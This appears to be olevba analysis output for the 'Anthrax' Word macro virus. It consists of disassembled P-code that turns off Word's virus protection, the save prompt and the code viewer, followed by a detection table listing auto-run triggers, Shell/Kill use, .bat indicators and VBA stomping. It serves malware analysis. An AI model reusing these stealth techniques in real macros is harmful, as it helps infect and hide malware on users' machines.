' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #167:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #168:
' 	OnError ErrorTM 
' Line #169:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #170:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #171:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #172:
' 	LitStr 0x000D "Virus Anthrax"
' 	MemStWith Heading 
' Line #173:
' 	LitStr 0x0028 "Attention, ce menu n'est pas autorisé..."
' 	MemStWith Then 
' Line #174:
' 	ArgsMemCallWith Show 0x0000 
' Line #175:
' 	EndWith 
' Line #176:
' 	Label ErrorTM 
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Sub ViewVBCode())
' Line #179:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #180:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #181:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #182:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #183:
' 	OnError ErrorVVBC 
' Line #184:
' 	LitStr 0x0021 "Virus Anthrax par ZeMacroKiller98"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #185:
' 	Label ErrorVVBC 
' Line #186:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Anthrax.bat         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

